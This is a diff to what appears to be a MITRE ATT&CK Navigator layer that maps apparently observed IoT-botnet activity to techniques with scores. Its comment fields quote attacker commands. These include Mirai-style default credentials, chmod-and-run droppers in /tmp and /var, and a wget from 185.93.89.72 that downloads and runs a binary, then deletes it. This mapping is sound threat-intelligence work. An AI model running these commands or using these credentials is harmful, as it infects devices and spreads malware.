@@ -10,26 +10,44 @@
   "techniques": [
     {
       "techniqueID": "T1059.004",
-      "score": 34,
-      "comment": "system; shell",
+      "score": 62,
+      "comment": "shell; sh",
       "enabled": true
     },
     {
       "techniqueID": "T1110.001",
-      "score": 20,
+      "score": 24,
       "comment": "enable\\x00 / linuxshell\\x00; root / xc3511",
       "enabled": true
     },
     {
+      "techniqueID": "T1222.002",
+      "score": 16,
+      "comment": ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/; >/var/d && chmod 777 /var/d && /var/d && cd /var/",
+      "enabled": true
+    },
+    {
       "techniqueID": "T1082",
-      "score": 7,
+      "score": 8,
       "comment": "/bin/./uname -s -v -n -r -m; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v ",
       "enabled": true
     },
     {
       "techniqueID": "T1083",
-      "score": 1,
-      "comment": "cd /proc && cat self/cmdline",
+      "score": 5,
+      "comment": "cd /proc && cat self/cmdline; cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1070.004",
+      "score": 5,
+      "comment": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w; echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon",
+      "enabled": true
+    },
+    {
+      "techniqueID": "T1105",
+      "score": 4,
+      "comment": "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w; http://185.93.89.72/wget",
       "enabled": true
     }
   ],
@@ -40,6 +58,6 @@
       "#ff5d73"
     ],
     "minValue": 0,
-    "maxValue": 34
+    "maxValue": 62
   }
 }
